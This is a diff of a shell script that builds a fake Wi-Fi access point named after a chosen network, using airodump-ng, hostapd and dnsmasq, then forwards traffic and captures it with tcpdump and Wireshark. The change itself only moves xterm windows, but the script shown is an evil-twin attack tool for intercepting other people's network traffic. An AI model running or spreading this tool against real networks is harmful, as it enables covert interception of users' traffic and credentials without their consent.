@@ -96,7 +96,7 @@ echo "driver=nl80211" >> hostapd.conf
 echo "ssid=$wifi" >> hostapd.conf
 echo "hw_mode=g" >> hostapd.conf
 echo -e "Let's FInd a channel using air"
-xterm -T "SCANNING FOR AP-CHANNEL" -e "sudo airodump-ng $int" &
+xterm -T "SCANNING FOR AP-CHANNEL" -geometry 93x31+1000000 -e "sudo airodump-ng $int" &
 read -p "Enter CHANNEL ID: " chn
 echo "channel=$chn" >> hostapd.conf
 echo "macaddr_acl=0" >> hostapd.conf
@@ -143,9 +143,9 @@ sudo ss -lp "sport = :domain"
 echo -e $RED$BOLD ">>>> PLEASE TEMINATE ANY DNS SESSION FROM DNSMASQ(use kill <PID>), If Not press Enter to continue <<<<"$RESET
 read -p "Continue: " any_key
 sudo systemctl stop systemd-resolved
-xterm -T "DNSMASQ SERVER" -e "sudo dnsmasq -C dnsmasq.conf -d" &
+xterm -T "DNSMASQ SERVER" -geometry 93x31+1000000 -e "sudo dnsmasq -C dnsmasq.conf -d" &
 sleep 2
-xterm -T "STARTING FAKE ACCESS POINT $wifi" -e "sudo hostapd hostapd.conf" &
+xterm -T "STARTING FAKE ACCESS POINT $wifi" -geometry 93x31+0 -e "sudo hostapd hostapd.conf" &
 sleep 4
 echo -e $YELLOW$BOLD"To provide the users with internet access, we need to forward traffic from the  virtual wireless adapter that is connected to the internet, to $int"$RESET
 ifconfig
@@ -159,7 +159,7 @@ curl -s $banner2|pv -q -L 9600
 sleep 3
 clear
 tcpdump -i $lol &
-xterm -T "SNIFFING ON $int " -e "wireshark -k -i $int" &
+xterm -T "SNIFFING ON $int " -geometry 93x31+0+590 -e "wireshark -k -i $int" &
 clear
 curl -s $banner2|pv -q -L 9600
 echo -e $BOLD"GOOD LUCKY!!!!!"
